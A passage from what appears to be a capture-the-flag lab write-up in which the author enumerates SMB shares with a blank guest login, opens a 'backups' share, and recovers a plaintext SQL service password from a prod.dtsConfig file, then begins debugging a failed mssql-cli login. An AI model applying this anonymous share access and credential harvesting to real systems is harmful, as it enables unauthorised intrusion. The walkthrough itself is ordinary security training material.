<p>So we can see that we have 4 shared drives here, 3 of them are disks and one of them is used for <a href="https://en.wikipedia.org/wiki/Inter-process_communication" target="_blank" rel="noopener noreferrer">Inter Process Communications (IPC)</a>. The IPC enables users to enumerate network shares and is created by default by the system (<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/inter-process-communication-share-null-session" target="_blank" rel="noopener noreferrer">source</a>). So I needed to focus on trying to access the disk shares as the IPC is the share that allows us to perform the enumeration in the first place. The $ suffix in the share name indicates it’s the share is hidden.
To access the share, I removed the <code>-L</code> flag and ran the following command to attempt to access the <code>ADMIN</code> share:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient //</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain">//ADMIN$ </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain">%</span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Same for the <code>C$</code> share (which is the <code>C</code> drive):</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient //</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain">//C$ </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain">%</span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tree connect failed: NT_STATUS_ACCESS_DENIED</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This indicates that the guest user doesn’t have access to these shares. But, we attempting to access the backups share, we were introduced with a shell!</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smbclient //</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token punctuation" style="color:#393A34">\</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">backups </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain">%</span><span class="token string" style="color:#e3116c">&quot; &quot;</span><span class="token plain">                                                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Try </span><span class="token string" style="color:#e3116c">&quot;help&quot;</span><span class="token plain"> to get a list of possible commands.                                                                                         </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">smb: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain">  </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I typed ‘help’ in the command prompt and found that the majority of the commands were pretty standard shell commands. For instance, I wanted to list the contents of the folder:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smb: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">dir</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token builtin class-name">.</span><span class="token plain">                                   D        </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  Mon Jan </span><span class="token number" style="color:#36acaa">20</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:20:57 </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain">                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">..</span><span class="token plain">                                  D        </span><span class="token number" style="color:#36acaa">0</span><span class="token plain">  Mon Jan </span><span class="token number" style="color:#36acaa">20</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:20:57 </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain">                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  prod.dtsConfig                     AR      </span><span class="token number" style="color:#36acaa">609</span><span class="token plain">  Mon Jan </span><span class="token number" style="color:#36acaa">20</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">14</span><span class="token plain">:23:02 </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain">                                                             </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                                                                                                                                        </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">                </span><span class="token number" style="color:#36acaa">10328063</span><span class="token plain"> blocks of size </span><span class="token number" style="color:#36acaa">4096</span><span class="token plain">. </span><span class="token number" style="color:#36acaa">8253724</span><span class="token plain"> blocks available </span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I found that there’s some type of configuration file named ‘prod.dtsConfig‘ there. To read its contents, I used the following command:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">smb: </span><span class="token punctuation" style="color:#393A34">\</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">more</span><span class="token plain"> prod.dtsConfig</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-markup codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-markup codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">DTSConfiguration</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                                                                                                                     </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">DTSConfigurationHeading</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                                                                                                          </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">DTSConfigurationFileInfo</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">GeneratedBy</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">...</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">GeneratedFromPackageName</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">...</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">GeneratedFromPackageID</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">...</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">GeneratedDate</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">20.1.201</span><br></span><span class="token-line" style="color:#393A34"><span class="token tag attr-value" style="color:#e3116c">9 10:01:34</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain">                                                                                                                          </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">DTSConfigurationHeading</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                                                                                                         </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Configuration</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">ConfiguredType</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">Property</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">Path</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">\Package.Connections[Destination].Properties[ConnectionString]</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">ValueType</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">String</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">ConfiguredValue</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Pers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ist Security Info=True;Auto Translate=False;</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">ConfiguredValue</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                                                                         </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Configuration</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                                                                                                                   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">DTSConfiguration</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Looks like we got some valuable information in this XML file. We can see in the <code>ConfiguredData</code> node that we have credentials which seem to belong to the SQL Server service:</p>
<div class="language-markup codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-markup codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">ConfiguredValue</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">...;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;...</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">ConfiguredValue</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We know from the initial scan that there’s an SQL Server running on the machine and we now have credentials to access it.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-to-sql-server">Connecting to SQL Server<a href="#connecting-to-sql-server" class="hash-link" aria-label="Direct link to Connecting to SQL Server" title="Direct link to Connecting to SQL Server">​</a></h2>
<p>In order to start working on SQL Server, I needed a client to connect to it and execute some commands there.
I found <a href="https://github.com/dbcli/mssql-cli" target="_blank" rel="noopener noreferrer"><code>dbcli/mssql-cli</code></a>. I installed it using the <code>pip</code> Python package manager and then attempted connecting to the MSSQL service using the credentials we found earlier:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pip3 </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> mssql-cli</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mssql-cli </span><span class="token parameter variable" style="color:#36acaa">-S</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$username</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-P</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Error message: Login failed </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> user </span><span class="token string" style="color:#e3116c">&#x27;ARCHETYPE/sql_svc&#x27;</span><span class="token builtin class-name">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To get some more information about the login failure, I needed to look at the logic within the <code>mssqlcli</code> main module. I found it by searching the filesystem:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> / </span><span class="token parameter variable" style="color:#36acaa">-wholename</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&quot;*mssqlcli/main.py&quot;</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token operator" style="color:#393A34">&amp;&gt;</span><span class="token plain"> /dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">~/.local/lib/python3.8/site-packages/mssqlcli/main.py</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I managed to find a way to increase the verbosity so I have more information about the source of the error by using the <code>--enable-sqltoolsservice-logging</code> command line option. This revealed a <code>NullReference</code> exception thrown from some C# logger class (which is likely a red-haring) and another exception coming from MSSQL connection service:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssql-cli </span><span class="token parameter variable" style="color:#36acaa">-S</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$username</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-P</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain"> --enable-sqltoolsservice-logging</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unhandled Exception: System.NullReferenceException: Object reference not </span><span class="token builtin class-name">set</span><span class="token plain"> to an instance of an object.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   at Microsoft.SqlTools.Utility.Logger.Close</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> D:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">\</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">src</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft.SqlTools.Hosting</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Utility</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Logger.cs:line </span><span class="token number" style="color:#36acaa">79</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   at Microsoft.SqlTools.ServiceLayer.Program.Main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">String</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> args</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> D:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">\</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">src</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft.SqlTools.ServiceLayer</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Program.cs:line </span><span class="token number" style="color:#36acaa">27</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Traceback </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">most recent call last</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/request.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">51</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> get_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    response </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self.json_rpc_client.get_response</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self.request_id, self.owner_uri</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">84</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> get_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    raise self.exception_queue.get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">124</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _listen_for_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    response </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self.reader.read_response</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">272</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> read_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">not self.needs_more_data or self.read_next_chunk</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">))</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">326</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> read_next_chunk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    raise EOFError</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">u</span><span class="token string" style="color:#e3116c">&#x27;End of stream reached, no output.&#x27;</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EOFError: End of stream reached, no output.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">During handling of the above exception, another exception occurred:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Traceback </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">most recent call last</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/usr/lib/python3.8/runpy.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">194</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _run_module_as_main</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">return</span><span class="token plain"> _run_code</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">code, main_globals, None,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">&quot;/usr/lib/python3.8/runpy.py&quot;</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">87</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _run_code</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    exec</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">code, run_globals</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" 